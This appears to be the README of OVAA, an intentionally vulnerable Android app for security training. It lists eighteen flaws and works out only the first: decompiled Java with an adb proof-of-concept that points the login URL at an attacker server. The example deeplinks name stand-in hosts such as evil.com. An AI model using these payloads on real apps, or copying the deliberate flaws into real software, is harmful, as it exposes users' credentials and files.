## Description
OVAA (Oversecured Vulnerable Android App) is an Android app that aggregates all the platform's known and popular security vulnerabilities.

## List of vulnerabilities
This section only includes the list of vulnerabilities, without a detailed description or proof of concept. Examples from OVAA will receive detailed examination and analysis on [our blog](https://blog.oversecured.com/).

### 1. Installation of an arbitrary `login_url` via deeplink `oversecured://ovaa/login?url=http://evil.com/`. Leads to the user's user name and password being leaked when they log in.


#### Root cause
```xml
<activity
    android:name="oversecured.ovaa.activities.DeeplinkActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="oversecured"
            android:host="ovaa"/>
    </intent-filter>
</activity>

```

```java
public void onCreate(Bundle bundle) {
        Uri data;
        super.onCreate(bundle);
        this.loginUtils = LoginUtils.getInstance(this);
        Intent intent = getIntent();
        if (intent != null && "android.intent.action.VIEW".equals(intent.getAction()) && (data = intent.getData()) != null) {
            processDeeplink(data);
        }
        finish();
    }
private void processDeeplink(Uri uri) {
        String queryParameter;
        String host;
        if ("oversecured".equals(uri.getScheme()) && "ovaa".equals(uri.getHost())) {
            String path = uri.getPath();
            if ("/login".equals(path)) {
                String queryParameter2 = uri.getQueryParameter("url");
                if (queryParameter2 != null) {
                    this.loginUtils.setLoginUrl(queryParameter2);
                }
                startActivity(new Intent(this, (Class<?>) EntranceActivity.class));
                return;
            }
        }
    }

```

```java
public class LoginUtils {
    private static final String EMAIL_KEY = "email";
    private static final String LOGIN_URL_KEY = "login_url";
    private static final String PASSWORD_KEY = "password";
    private static LoginUtils utils;
    private Context context;
    private SharedPreferences.Editor editor;
    private SharedPreferences preferences;

    private LoginUtils(Context context) {
        this.context = context;
        SharedPreferences sharedPreferences = context.getSharedPreferences("login_data", 0);
        this.preferences = sharedPreferences;
        this.editor = sharedPreferences.edit();
    }

    public void setLoginUrl(String str) {
        this.editor.putString(LOGIN_URL_KEY, str).commit();
    }
}
```


```java
public class EntranceActivity extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (LoginUtils.getInstance(this).isLoggedIn()) {
            startActivity(new Intent("oversecured.ovaa.action.ACTIVITY_MAIN"));
        } else {
            startActivity(new Intent("oversecured.ovaa.action.LOGIN"));
        }
        finish();
    }
}
```


```java
public class LoginActivity extends AppCompatActivity {
    public static final String INTENT_REDIRECT_KEY = "redirect_intent";
    private LoginUtils loginUtils;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_login);
        LoginUtils loginUtils = LoginUtils.getInstance(this);
        this.loginUtils = loginUtils;
        if (loginUtils.isLoggedIn()) {
            onLoginFinished();
        } else {
            findViewById(R.id.loginButton).setOnClickListener(new View.OnClickListener() { // from class: oversecured.ovaa.activities.LoginActivity.1
                @Override // android.view.View.OnClickListener
                public void onClick(View view) {
                    String obj = ((TextView) LoginActivity.this.findViewById(R.id.emailView)).getText().toString();
                    String obj2 = ((TextView) LoginActivity.this.findViewById(R.id.passwordView)).getText().toString();
                    if (TextUtils.isEmpty(obj)) {
                        Toast.makeText(LoginActivity.this, "Email is emply!", 1).show();
                    } else if (TextUtils.isEmpty(obj2)) {
                        Toast.makeText(LoginActivity.this, "Password is emply!", 1).show();
                    } else {
                        LoginActivity.this.processLogin(obj, obj2);
                    }
                }
            });
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void processLogin(String str, String str2) {
        LoginData loginData = new LoginData(str, str2);
        Log.d("ovaa", "Processing " + loginData);
        ((LoginService) RetrofitInstance.getInstance().create(LoginService.class)).login(this.loginUtils.getLoginUrl(), loginData).enqueue(new Callback<Void>() { // from class: oversecured.ovaa.activities.LoginActivity.2
            @Override // retrofit2.Callback
            public void onFailure(Call<Void> call, Throwable th) {
            }

            @Override // retrofit2.Callback
            public void onResponse(Call<Void> call, Response<Void> response) {
            }
        });
        this.loginUtils.saveCredentials(loginData);
        onLoginFinished();
    }

    private void onLoginFinished() {
        Intent intent = (Intent) getIntent().getParcelableExtra(INTENT_REDIRECT_KEY);
        if (intent != null) {
            startActivity(intent);
        } else {
            startActivity(new Intent(this, (Class<?>) MainActivity.class));
        }
        finish();
    }
}
```

#### Proof of Concept
```bash
adb shell am start -a android.intent.action.VIEW -d "oversecured://ovaa/login?url=https://yourserver"
```

### 2. Obtaining access to arbitrary content providers (not exported, but with the attribute `android:grantUriPermissions="true"`) via deeplink `oversecured://ovaa/grant_uri_permissions`. The attacker's app needs to process `oversecured.ovaa.action.GRANT_PERMISSIONS` and pass intent to `setResult(code, intent)` with flags such as `Intent.FLAG_GRANT_READ_URI_PERMISSION` and the URI of the content provider.

#### Root Cause

#### Proof of Concept

### 3. Vulnerable host validation when processing deeplink `oversecured://ovaa/webview?url=...`. 
#### Root Cause

#### Proof of Concept

### 4. Opening arbitrary URLs via deeplink `oversecured://ovaa/webview?url=http://evilexample.com`. An attacker can use the vulnerable WebView setting `WebSettings.setAllowFileAccessFromFileURLs(true)` in the `WebViewActivity.java` file to steal arbitrary files by sending them XHR requests and obtaining their content.
#### Root Cause

#### Proof of Concept

### 5. Access to arbitrary activities and acquiring access to arbitrary content providers in `LoginActivity` by supplying an arbitrary Intent object to `redirect_intent`.
#### Root Cause

#### Proof of Concept

### 6. Theft of arbitrary files in `MainActivity` by intercepting an activity launch from `Intent.ACTION_PICK` and passing the URI to any file as data.
#### Root Cause

#### Proof of Concept

### 7. Insecure broadcast to `MainActivity` containing credentials. The attacker can register a broadcast receiver with action `oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA` and obtain the user's data.
#### Root Cause

#### Proof of Concept

### 8. Insecure activity launch in `MainActivity` with action `oversecured.ovaa.action.WEBVIEW`, containing the user's encrypted data in the query parameter `token`.
#### Root Cause

#### Proof of Concept

### 9. Deletion of arbitrary files via the insecure `DeleteFilesSerializable` deserialization object.
#### Root Cause

#### Proof of Concept

### 10. Memory corruption via the `MemoryCorruptionParcelable` object.
#### Root Cause

#### Proof of Concept

### 11. Memory corruption via the `MemoryCorruptionSerializable` object.
#### Root Cause

#### Proof of Concept

### 12. Obtaining read/write access to arbitrary files in `TheftOverwriteProvider` via path-traversal in the value `uri.getLastPathSegment()`.
#### Root Cause

#### Proof of Concept

### 13. Obtaining access to app logs via `InsecureLoggerService`. Leak of credentials in `LoginActivity` `Log.d("ovaa", "Processing " + loginData)`.
#### Root Cause

#### Proof of Concept

### 14. Use of the hardcoded AES key in `WeakCrypto`.
#### Root Cause

#### Proof of Concept

### 15. Arbitrary Code Execution in `OversecuredApplication` by launching code from third-party apps with no security checks.
#### Root Cause

#### Proof of Concept

### 16. Use of very wide file sharing declaration for `oversecured.ovaa.fileprovider` content provider in `root` entry.
#### Root Cause

#### Proof of Concept

### 17. Hardcoded credentials to a dev environment endpoint in `strings.xml` in `test_url` entry.
#### Root Cause

#### Proof of Concept

### 18. Arbitrary code execution via a DEX library located in a world-readable/writable directory.
#### Root Cause

#### Proof of Concept

---------------------------------------
*Licensed under the Simplified BSD License*

*Copyright (c) 2020, Oversecured Inc*

https://oversecured.com/
